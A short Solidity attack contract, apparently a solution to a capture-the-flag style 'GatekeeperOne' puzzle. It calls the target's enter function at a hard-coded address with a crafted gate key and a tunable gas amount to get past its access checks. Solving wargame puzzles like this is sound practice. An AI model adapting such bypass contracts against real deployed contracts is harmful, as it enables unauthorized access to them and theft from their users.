// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperOne.sol";
/* AABBCCDD0000afF8  */
contract PenetrateAllGates{

    GatekeeperOne g1= GatekeeperOne(0xEcB4CC6e2dAc4CdB268E663B862A564ca702Ad9D);
    

    function startAttack(uint256 _gas) public {
        (bool success, ) = address(0xEcB4CC6e2dAc4CdB268E663B862A564ca702Ad9D).call{gas: _gas}(
            abi.encodeWithSignature("enter(bytes8)", bytes8(0xAABBCCDD0000afF8))
        );
        require(success); 
    }
}